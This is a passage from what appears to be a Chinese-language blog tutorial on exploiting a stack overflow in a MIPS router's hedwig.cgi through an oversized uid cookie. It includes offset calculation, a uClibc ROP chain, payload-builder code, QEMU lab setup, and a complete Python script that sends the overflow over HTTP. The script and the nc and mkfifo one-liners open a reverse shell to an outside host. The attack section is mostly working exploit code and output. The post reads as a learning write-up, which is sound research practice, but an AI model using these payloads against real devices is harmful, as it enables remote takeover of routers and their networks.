class="string">&quot;x=x&quot;</span>  `python -c <span class="string">&quot;print &#x27;uid=&#x27; + open(&#x27;test&#x27;,&#x27;r&#x27;).read()&quot;</span>`</span></span><br><span class="line"></span><br><span class="line">INPUT=&quot;$1&quot;</span><br><span class="line">COOKIE=&quot;$2&quot;</span><br><span class="line">PORT=&quot;23946&quot;</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)</span><br><span class="line">cp $(which qemu-mipsel-static) ./qemu</span><br><span class="line"></span><br><span class="line">echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$COOKIE -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;127.0.0.1&quot;  -g $PORT /htdocs/web/hedwig.cgi</span><br><span class="line">rm -f ./qemu</span><br></pre></td></tr></table></figure><p>覆盖<code>$ra</code>后</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026190259828.png" alt="image-20211026190259828"></p><p>计算偏移量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 patternLocOffset.py -s 0x68423668 -l 2000</span><br><span class="line">[*] Create pattern string contains 2000 characters ok!</span><br><span class="line">[*] No exact matches, looking for likely candidates...</span><br><span class="line">[+] Possible match at offset 1009 (adjusted another-endian)</span><br><span class="line">[+] take time: 0.0004 s</span><br></pre></td></tr></table></figure><p>得到偏移<code>1009</code></p><h3 id="ROP链的构造"><a href="#ROP链的构造" class="headerlink" title="ROP链的构造"></a>ROP链的构造</h3><p>首先要找到使用的libc.so</p><p>使用该命令利用脚本 <code>dbgscript</code> 方便每次我们用 <code>gdb-multiarch</code> 连接:<code>gdb-multiarch htdocs/cgibin -x dbgscript</code></p><p><strong>dbgscript 内容</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set arch mips</span><br><span class="line">set endian little</span><br><span class="line">target remote :23946</span><br></pre></td></tr></table></figure><p>但实际上，我们查看<code>lib</code>目录下的<code>libc.so.0</code>即可知</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026202802245.png" alt="image-20211026202802245"></p><p>接着获得system的地址， IDA打开， 搜索<code>system()</code>，可知<code>system()</code>在<code>libc</code>中偏移为<code>0x53200</code>, 加上基地址即可</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026204203964.png" alt="image-20211026204203964"></p><p>当然我们也可以通过pwntools进行获取</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./lib/libuClibc-0.9.30.1.so&quot;</span>)</span><br><span class="line">libc.address = <span class="number">0x7f738000</span> <span class="comment"># base address</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] system address: 0x7f78b200</span><br></pre></td></tr></table></figure><p>为了避开<code>0x00</code>，写入时<code>0x7f78b200- 1 = 0x767a8b1ff</code>，后面再找一个 gadget 加一即可</p><p>然后便是找一个能将<code>system()</code>首个参数写入<code>$a0</code>的 gadget，这里在<code>libuClibc-0.9.30.1.so</code>中使用<code>mipsrop</code>插件，利用<code>mipsrop.stackfinder()</code>命令找将栈上数据放入寄存器的 gadget：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026210227919.png" alt="image-20211026210227919"></p><p>如上图，偏移<code>0x159cc</code>处，将<code>$sp+10</code>处的数据放入<code>$s5</code>后再放入<code>$a0</code>，然后跳到<code>$s5</code>中存的地址处</p><p>而根据下面这张图，<code>hedwigcgi_main()</code>结尾部分：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026210355070.png" alt="image-20211026210355070"></p><p>我们可以得到栈上的布局应该为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">padding: 0x3CD</span><br><span class="line">$s0</span><br><span class="line">$s1</span><br><span class="line">$s2</span><br><span class="line">$s3</span><br><span class="line">$s4</span><br><span class="line">$s5</span><br><span class="line">$s6</span><br><span class="line">$s7</span><br><span class="line">$fp</span><br><span class="line">$ra &lt;== 返回地址</span><br><span class="line">offset: 0x10</span><br><span class="line">/bin/sh</span><br></pre></td></tr></table></figure><p>其中<code>$s0~$s7, $fp, $ra</code>我们都能控制</p><p>再找一个能把<code>system()</code>地址值加一（即对对应寄存器加一）的 gadget，命令<code>mipsrop.find(&quot;addiu .*,1&quot;)</code>，这里我们选用偏移<code>0x158D0</code>处的：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026211325129.png" alt="image-20211026211325129"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p><strong>如下</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> MIPSPayload <span class="keyword">import</span> MIPSPayload</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">payload = MIPSPayload(<span class="number">0x7f738000</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./lib/libuClibc-0.9.30.1.so&quot;</span>)</span><br><span class="line">libc.address = <span class="number">0x7f738000</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br><span class="line">calcsystem = <span class="number">0x158c8</span>    <span class="comment"># $s0 add 1, jalr $s5</span></span><br><span class="line">callsystem = <span class="number">0x159cc</span>    <span class="comment"># cmd -&gt; $a0, jalr $s0 (system_addr)</span></span><br><span class="line"></span><br><span class="line">payload.AddBuffer(<span class="number">0x3CD</span>)                    <span class="comment">#       973</span></span><br><span class="line">payload.AddAddress(system_addr - <span class="number">1</span>)         <span class="comment"># $s0   977</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s1   981</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s2   985</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s3   989</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s4   993                     </span></span><br><span class="line">payload.AddAddress(callsystem)              <span class="comment"># $s5   997</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s6   1001</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s7   1005</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $fp   1009</span></span><br><span class="line">payload.AddAddress(calcsystem)              <span class="comment"># $ra</span></span><br><span class="line">payload.AddBuffer(<span class="number">0x10</span>)                     <span class="comment"># .text:000159CC  addiu   $s5, $sp, 0x170+var_160</span></span><br><span class="line">payload.Add(<span class="string">b&#x27;//bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;exploit&quot;</span>, <span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">f.write(payload.Build())</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>其中<code>MIPSPayload</code>为仿照书中写的</p><blockquote><p>其实也不知道写了有啥用, 很多pwntools已经集成了</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string, random, sys</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MIPSPayload</span>:</span></span><br><span class="line">    BADBYTES = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    LITTLE = <span class="string">&quot;little&quot;</span></span><br><span class="line">    BIG = <span class="string">&quot;big&quot;</span></span><br><span class="line">    FILLER = <span class="string">b&quot;A&quot;</span></span><br><span class="line">    BYTES = <span class="number">4</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, elfbase:<span class="built_in">int</span>, endian:<span class="built_in">str</span> = LITTLE, badbytes: <span class="built_in">bytes</span> = BADBYTES</span>):</span></span><br><span class="line">        self.elfbase = elfbase</span><br><span class="line">        self.badbytes = badbytes</span><br><span class="line">        self.endian = endian</span><br><span class="line">        self.payload = <span class="built_in">bytes</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rand_text</span>(<span class="params">self, size</span>):</span></span><br><span class="line">        table = (string.ascii_letters + string.digits).encode()</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(random.choices(table, k=size))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">bytes</span>:</span><br><span class="line">            self.payload += data</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;%s is no support type&quot;</span> % <span class="built_in">type</span>(data))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Address</span>(<span class="params">self, offset, base=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> base <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            base = self.elfbase</span><br><span class="line">        <span class="keyword">return</span> self.ToBytes(base + offset)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddAddress</span>(<span class="params">self, offset, base=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.Add(self.Address(offset, base))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ToBytes</span>(<span class="params">self, value, size=BYTES</span>):</span></span><br><span class="line">        data = [(value &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size)]</span><br><span class="line">        <span class="keyword">if</span> self.endian != self.LITTLE:</span><br><span class="line">            data = data[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddNOPs</span>(<span class="params">self, size</span>):</span></span><br><span class="line">        self.Add(self.rand_text(size))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddBuffer</span>(<span class="params">self, size, byte=FILLER</span>):</span></span><br><span class="line">        self.Add(byte * size)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Build</span>(<span class="params">self</span>):</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.payload:</span><br><span class="line">            <span class="keyword">if</span> self.badbytes.find(c) != -<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;Bad byte found in payload at offset %d: 0x%.2X&quot;</span> % (count, c))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self.payload</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Print</span>(<span class="params">self, bpl = BYTES</span>):</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.payload:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line">            sys.stdout.write(<span class="string">&quot;\\x%.2X&quot;</span> % c)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">if</span> bpl &gt; <span class="number">0</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>生成exp</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 exp.py</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">[+] system address: 0x7f78b200</span><br></pre></td></tr></table></figure><h3 id="动调验证"><a href="#动调验证" class="headerlink" title="动调验证"></a>动调验证</h3><h4 id="QEMU-User-Mode"><a href="#QEMU-User-Mode" class="headerlink" title="QEMU-User-Mode"></a>QEMU-User-Mode</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./test.sh &#x27;x=x&#x27; `python -c &quot;print &#x27;uid=&#x27; + open(&#x27;exploit&#x27;,&#x27;r&#x27;).read()&quot;`</span><br></pre></td></tr></table></figure><p>可知我们成功进入了 system 函数中</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026213334385.png" alt="image-20211026213334385"></p><p>但继续运行会导致crash且也没有获得shell</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026213720457.png" alt="image-20211026213720457"></p><p>分析system函数可知system以fork形式启动进程，并且当程序为子进程时跳转执行cmd：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026213740965.png" alt="image-20211026213740965"></p><p>尝试反弹shell命令<code>nc -e /bin/bash 127.0.0.1 1234</code></p><p>这里需要注意的是，如果还是用下面的命令的话，因为有空格会导致在传递参数时截断</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./test.sh  &quot;x=1&quot;  `python -c &quot;print &#x27;uid=&#x27; + open(&#x27;exploit&#x27;,&#x27;r&#x27;).read()&quot;`</span><br></pre></td></tr></table></figure><p>直接修改sh脚本即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> test3.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sudo ./test3.sh  <span class="string">&quot;x=x&quot;</span></span></span><br><span class="line"></span><br><span class="line">INPUT=&quot;$1&quot;</span><br><span class="line">COOKIE=$(python -c &quot;print &#x27;uid=&#x27; + open(&#x27;exploit&#x27;,&#x27;r&#x27;).read()&quot;)</span><br><span class="line">PORT=&quot;23946&quot;</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)</span><br><span class="line">cp $(which qemu-mipsel-static) ./qemu</span><br><span class="line">echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=&quot;$COOKIE&quot; -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;127.0.0.1&quot; /htdocs/web/hedwig.cgi</span><br><span class="line">rm -f ./qemu</span><br></pre></td></tr></table></figure><p>也无法获得shell, 查看各种参考基本上说的是<code>qemu-user-mode</code>的问题 但也没说为啥</p><p>因为necat和ncat中nc版本的不同，有可能没有-e命令，试了下面的反弹方法也不行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkfifo /tmp/f &amp;&amp; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f</span><br></pre></td></tr></table></figure><ul><li>这里由于读入问题，不能用分号。所以直接将<code>rm /tmp/f</code>去掉，用<code>&amp;&amp;</code>代替<code>分号</code></li></ul><h4 id="QEMU-System-Mode"><a href="#QEMU-System-Mode" class="headerlink" title="QEMU-System-Mode"></a>QEMU-System-Mode</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-5kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap -nographic</span><br></pre></td></tr></table></figure><p>复制<code>squashfs-root</code>到虚拟机<code>sudo scp -r squashfs-root root@192.168.126.131:/root/ </code></p><p>在<code>squashfs-root</code>中放置配置文件conf</p><blockquote><p>留个坑，需要再来研究这个配置文件怎么写</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  #开启log</span><br><span class="line">ErrorLog /log #log文件</span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class="line">    ServerId &quot;1234&quot;</span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0 #对应qemu虚拟机的网卡</span><br><span class="line">    Address 192.168.126.129 #对于qemu虚拟机IP</span><br><span class="line">    Port &quot;1234&quot; #对应未被使用的端口</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在虚拟机的<code>squashfs-root</code>下执行如下指令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">cp conf /</span><br><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">rm /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libc.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so.1  /lib/</span><br><span class="line">cp lib/ld-uClibc.so.0  /lib/</span><br><span class="line">cp lib/libcrypt.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cd</span> /</span><br></pre></td></tr></table></figure><p>根据配置及固件，还需要在MIPS虚拟机中建立两个软连接：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">/httpd -f /conf</span><br></pre></td></tr></table></figure><p>然后通过<code>curl http://192.168.126.129:1234/hedwig.cgi -v -X POST -H &quot;Content-Length: 8&quot; -b &quot;uid=zh&quot;</code>即可验证 web 服务是否正常启动</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211027192701402.png" alt="image-20211027192701402"></p><h5 id="确认偏移"><a href="#确认偏移" class="headerlink" title="确认偏移"></a>确认偏移</h5><p>动调脚本，这里需要提前将 MIPSEL 架构的 gdbserver 传到 qemu 虚拟机中，这里选择了别人编译好的<a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle">gdbserver</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">export CONTENT_LENGTH=&quot;100&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat test`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;/hedwig.cgi&quot;</span><br><span class="line">echo &quot;uid=1234&quot;|./gdbserver.mipsel 192.168.126.129:6666 /htdocs/web/hedwig.cgi #IP为宿主机IP</span><br></pre></td></tr></table></figure><p>宿主机连接 gdbserver</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch htdocs/cgibin</span><br><span class="line">set architecture mips</span><br><span class="line">target remote 192.168.126.129:6666 #对应qemu地址和端口</span><br></pre></td></tr></table></figure><p>可以测试得偏移仍然是<code>1009</code></p><h5 id="确定-libc-基址"><a href="#确定-libc-基址" class="headerlink" title="确定 libc 基址"></a>确定 libc 基址</h5><p>在这之前我们先关掉地址随机化：<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p><blockquote><p>正常路由环境和MIPS虚拟机中为了程序运行速度会取消canary，地址随机化等保护机制</p></blockquote><p>接下来是确定 libc 的基地址，利用如下命令</p><ul><li>我这边的环境的话，概率成功需要多试几次</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/htdocs/web/hedwig.cgi &amp; cat /proc/PID/maps</span><br><span class="line"><span class="meta">#</span><span class="bash"> a &amp; b-&gt;先执行a再执行b，无论a是否成功</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@debian-mipsel:# /htdocs/web/hedwig.cgi&amp;cat /proc/1514/maps</span><br><span class="line">[1] 1514</span><br><span class="line">00400000-0041c000 r-xp 00000000 08:01 228956     /htdocs/cgibin</span><br><span class="line">0042c000-0042d000 rw-p 0001c000 08:01 228956     /htdocs/cgibin</span><br><span class="line">0042d000-0042f000 rwxp 00000000 00:00 0          [heap]</span><br><span class="line">2aaa8000-2aaad000 r-xp 00000000 08:01 547912     /lib/ld-uClibc-0.9.30.1.so</span><br><span class="line">2aaad000-2aaae000 rw-p 00000000 00:00 0 </span><br><span class="line">2aabc000-2aabd000 r--p 00004000 08:01 547912     /lib/ld-uClibc-0.9.30.1.so</span><br><span class="line">2aabd000-2aabe000 rw-p 00005000 08:01 547912     /lib/ld-uClibc-0.9.30.1.so</span><br><span class="line">2aabe000-2aae7000 r-xp 00000000 08:01 547913     /lib/libgcc_s.so.1</span><br><span class="line">2aae7000-2aaf7000 ---p 00000000 00:00 0 </span><br><span class="line">2aaf7000-2aaf8000 rw-p 00029000 08:01 547913     /lib/libgcc_s.so.1</span><br><span class="line">2aaf8000-2ab56000 r-xp 00000000 08:01 547915     /lib/libuClibc-0.9.30.1.so</span><br><span class="line">2ab56000-2ab65000 ---p 00000000 00:00 0 </span><br><span class="line">2ab65000-2ab66000 r--p 0005d000 08:01 547915     /lib/libuClibc-0.9.30.1.so</span><br><span class="line">2ab66000-2ab67000 rw-p 0005e000 08:01 547915     /lib/libuClibc-0.9.30.1.so</span><br><span class="line">2ab67000-2ab6c000 rw-p 00000000 00:00 0 </span><br><span class="line">7fd0a000-7fd1f000 rwxp 00000000 00:00 0          [stack]</span><br><span class="line">root@debian-mipsel:/proc# HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;no xml data.&lt;/message&gt;&lt;/hedwig&gt;</span><br></pre></td></tr></table></figure><p>可以看到<code>libc.so.0 -&gt; /lib/libuClibc-0.9.30.1.so</code>的加载基址为<code>0x2aaf8000</code></p><h5 id="EXP-HTTP发包"><a href="#EXP-HTTP发包" class="headerlink" title="EXP+HTTP发包"></a>EXP+HTTP发包</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload</span>(<span class="params">offset, libc_base, cmd</span>):</span></span><br><span class="line">    Calcsystem = <span class="number">0x158c8</span>    <span class="comment"># $s0 add 1, jalr $s5</span></span><br><span class="line">    Callsystem = <span class="number">0x159cc</span>    <span class="comment"># &#x27;/bin/sh&#x27; -&gt; $a0, jalr system</span></span><br><span class="line">    system_addr_1 = <span class="number">0x53200</span> - <span class="number">1</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * offset  <span class="comment"># 973</span></span><br><span class="line">    payload += p32(libc_base + system_addr_1)  <span class="comment"># s0     977</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s1     981</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s2     985</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s3     989</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s4     993</span></span><br><span class="line">    payload += p32(libc_base + Callsystem)     <span class="comment"># s5     997</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s6     1001</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s7     1005</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># fp     1009</span></span><br><span class="line">    payload += p32(libc_base + Calcsystem)     <span class="comment"># ra</span></span><br><span class="line">    payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">    payload += cmd</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">b&quot;nc -e /bin/bash 192.168.141.225 4444&quot;</span></span><br><span class="line">    cookie = <span class="string">b&#x27;uid=&#x27;</span> + get_payload(<span class="number">973</span>, <span class="number">0x2aaf8000</span>, cmd)</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: cookie,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;100&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;x&#x27;</span>&#125;</span><br><span class="line">    ip_port = sys.argv[<span class="number">1</span>]</span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + ip_port + <span class="string">&quot;/hedwig.cgi&quot;</span></span><br><span class="line">    r = requests.post(url=url, headers=header, data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>执行, 成功getshell</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211027202354842.png" alt="image-20211027202354842"></p>]]></content>
      
      
      <categories>
          
